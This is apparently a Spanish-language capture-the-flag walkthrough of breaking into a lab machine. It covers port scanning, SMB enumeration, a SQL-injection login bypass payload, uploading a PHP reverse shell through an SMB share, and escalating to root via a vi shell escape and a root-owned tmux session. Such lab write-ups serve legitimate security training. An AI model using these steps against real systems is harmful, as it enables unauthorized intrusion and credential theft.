### Tags: `tmux` `printenv` `env`

# Escaneo (**139, 445, 8080, 8082**)

```css
sudo nmap -p- --open -sSCV --min-rate 4000 -vvv -n -Pn <IP> -oN escaneo
```

![image](https://github.com/user-attachments/assets/932f00ae-39eb-4da7-98a8-bd4cd90b8deb)

# Port 139

Con `rpcclient` nos conectamos sin credenciales y pudimos enumerar un usuario `arthurmorgan`

```ruby
rpcclient <IP> -U '' -N 
```

![image](https://github.com/user-attachments/assets/2c547aa7-7c8f-4e68-81d6-333f5d803cb7)


# Port 8082 

En el puerto **8080** ``por ahora`` no encontramos nada por ende nos vamos a este y tiramos de un ``Gobuster`` y nos encontró este panel de login

```ruby
gobuster dir -u http://IP:8082/ -t 150 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,php,html --no-error
```

![image](https://github.com/user-attachments/assets/fdeff637-2bfa-41ea-96b9-47e62b5a5efa)


Tenemos este panel:

![image](https://github.com/user-attachments/assets/b7819165-2761-498a-9bd0-d3f7fd701b32)

Pronado **SQLinjections** obtuvimos que si ponemos  `"or 1=1` no da un **Internal Error**, (en esta parte me trabe y tuve q mirar un WriteUp)

```ruby
" or "=" or "
```

![image](https://github.com/user-attachments/assets/35580a74-e287-48d5-a5e1-d506110baa89)

Vemos que nos dio usuarios y contraseñas

![image](https://github.com/user-attachments/assets/893961eb-d698-4ada-81de-24296b5da7aa)


# Smbclient

Por `smbclient` vemos esto:

```ruby
smbclient -L \\\\<IP>\\ -U 'tove'
```

![image](https://github.com/user-attachments/assets/6e5c7bae-c3e3-4640-b874-02028255ede1)

Ahora con este comando nos conectamos con este usuario y esta contraseña `ArthurMorgan:DeadEye`

```ruby
smbclient -U ArthurMorgan \\\\<IP>\\SECURED 
```

Como vemos que funciono una ves dentro vemos un archivo `note.txt` , lo  miramos y dice esto

```
Secure File Upload and Testing Functionality
```

### DIRB

Entonces tratamos de buscar donde estaba el archivo `note.txt` en la web y resulta que haciendo un:

```ruby
gobuster dir -q -u http://IP:8080/ -w /usr/share/wordlists/dirb/common.txt  
```

Nos encontró una ruta `/dev` que es donde esta el **note.txt**

![image](https://github.com/user-attachments/assets/43cb2f62-e905-482f-b647-795455192f5d)
![image](https://github.com/user-attachments/assets/63d2a667-9676-4c21-b055-976cf22b6295)


Como pudimos conectarnos por **smb** y sabemos donde se *almacenan* los archivos, lo que podemos hacer es subir un **reverse shell en PHP** 

![image](https://github.com/user-attachments/assets/b09cfe83-902b-40c5-9dca-bc00f86871fe)

Antes nos ponemos en escucha con `netcat` y llamamos al archivo.php

![image](https://github.com/user-attachments/assets/6d9eafd1-afee-4302-9218-3dc83da7804b)

![image](https://github.com/user-attachments/assets/c6f68002-b062-4773-b326-3c22f766481c)


# Escalada (``ArthurMorgan``)

Como teníamos una contraseña la probamos y funciono `DeadEye`

![image](https://github.com/user-attachments/assets/7bb2a385-9ea5-47d7-86de-e4d57fde6979)

# Escalada (``marston``)

Poniendo `printenv` que es para ver la variables de entorno que están configuradas en el sistema y observamos el puerto ``4545 OPEN``

![image](https://github.com/user-attachments/assets/704b3066-2737-4497-a882-414ed1a2f5e2)

Con **Netcat** intentamos abrir el puerto y tuvimos éxito, y observamos que hay cuatro opciones 

![image](https://github.com/user-attachments/assets/220e81e6-e5f2-4ef7-967f-7354ad21a248)

Para escalar a *marston* tenemos que elegir la opción 4 que no abre el editor de VI y poner `:!/bin/bash`

![image](https://github.com/user-attachments/assets/46db2c14-20a8-4057-8300-f98022850a36)


# Escalada *ROOT*

Ahora para escalar a `root` la verdad se me hizo difícil y por ende mire un WriteUp. Haciendo un `ps -aux` vemos un session en **TMUX**

![image](https://github.com/user-attachments/assets/a4e2db1b-0afd-49d8-a98e-4632097c1803)

Ahora si hacemos un `tmux ls` vemos que la session tiene abierto 9 ventanas

![image](https://github.com/user-attachments/assets/958fff47-0fa6-4ad7-95ff-72b35b571b11)

Entonces para ganar acceso como `ROOT` lo que hacemos es poner 

```ruby
tmux attach-session -t 0
```

Una ves puesto lo de arriba lo único que hay que poner es `exit` en todas las ventanas hasta llegar acá:

![image](https://github.com/user-attachments/assets/e9907245-d2d1-4db2-98af-e88224cfb1d9)









